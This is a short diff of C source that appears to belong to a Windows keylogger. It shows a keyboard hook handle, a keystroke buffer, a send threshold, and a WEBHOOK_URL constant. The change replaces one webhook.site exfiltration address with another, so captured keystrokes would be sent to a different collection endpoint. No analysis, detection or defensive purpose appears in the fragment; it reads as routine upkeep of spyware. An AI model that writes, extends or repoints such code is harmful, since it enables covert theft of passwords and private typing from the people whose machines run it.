@@ -4,7 +4,7 @@
 
 #define BUFFER_SIZE 1024
 #define MIN_SEND_THRESHOLD 10
-#define WEBHOOK_URL "https://webhook.site/def6f930-c87d-4977-b83f-ae342fc681a2"
+#define WEBHOOK_URL "https://webhook.site/04388c64-26b4-4d7a-b158-3623af8eb279"
 
 HHOOK hKeyboardHook;
 char keystrokeBuffer[BUFFER_SIZE] = {0};
